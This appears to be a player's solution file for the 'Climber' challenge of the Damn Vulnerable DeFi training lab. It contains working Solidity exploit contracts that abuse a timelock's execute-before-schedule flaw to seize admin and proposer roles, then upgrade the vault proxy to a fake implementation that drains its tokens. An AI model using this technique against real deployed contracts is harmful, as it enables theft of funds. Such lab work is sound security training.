// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE, ClimberTimelockBase} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        TimeLockAttacker attacker = new TimeLockAttacker(
            timelock,
            token,
            vault,
            player,
            recovery
        );
        attacker.attack();
        assertTrue(
            timelock.hasRole(PROPOSER_ROLE, address(attacker)),
            "Attacker should have proposer role"
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract FakeVault {
    function sweepFunds(address token, address beneficiery) external {
        ERC20(token).transfer(
            beneficiery,
            ERC20(token).balanceOf(address(this))
        );
    }

    function proxiableUUID() external pure returns (bytes32) {
        // return ERC1967Utils.IMPLEMENTATION_SLOT;
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}

contract TimeLockAttacker {
    ClimberTimelock private timelock;
    DamnValuableToken private token;
    ClimberVault private vault;
    address private player;
    address private recovery;

    constructor(
        ClimberTimelock _timelock,
        DamnValuableToken _token,
        ClimberVault _vault,
        address _player,
        address _recovery
    ) {
        timelock = _timelock;
        token = _token;
        vault = _vault;
        player = _player;
        recovery = _recovery;
    }

    function attack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory calldatas,
            bytes32 salt
        ) = _getAttackData();

        bytes32 operationId = timelock.getOperationId(
            targets,
            values,
            calldatas,
            salt
        );

        console.log("Operation Id: ");
        console.logBytes32(operationId);
        ClimberTimelockBase.OperationState state = timelock.getOperationState(
            operationId
        );

        //timelock.updateDelay(0);
        console.log("Operation state before scheduling: ", uint256(state));
        try timelock.execute(targets, values, calldatas, salt) {} catch {}

        state = timelock.getOperationState(operationId);

        console.log("Operation state after scheduling: ", uint256(state));

        //Change the vault implementation proposal
        _changeVaultImplementationAndSweepFunds();
    }

    function _changeVaultImplementationAndSweepFunds() internal {
        address[] memory targets = new address[](1);
        targets[0] = address(vault);

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(new FakeVault()),
            abi.encodeWithSelector(
                FakeVault.sweepFunds.selector,
                address(token),
                recovery
            )
        );

        timelock.schedule(
            targets,
            values,
            calldatas,
            bytes32(keccak256("peper"))
        );

        timelock.execute(
            targets,
            values,
            calldatas,
            bytes32(keccak256("peper"))
        );
    }

    function schedule() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory calldatas,
            bytes32 salt
        ) = _getAttackData();

        timelock.schedule(
            targets,
            values,
            calldatas,
            bytes32(keccak256("peper"))
        );
    }

    function _getAttackData()
        internal
        view
        returns (address[] memory, uint256[] memory, bytes[] memory, bytes32)
    {
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(timelock);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory calldatas = new bytes[](4);
        calldatas[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
        calldatas[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            ADMIN_ROLE,
            address(this)
        );
        calldatas[2] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );
        calldatas[3] = abi.encodeWithSelector(
            TimeLockAttacker.schedule.selector
        );

        return (targets, values, calldatas, keccak256("peper"));
    }
}
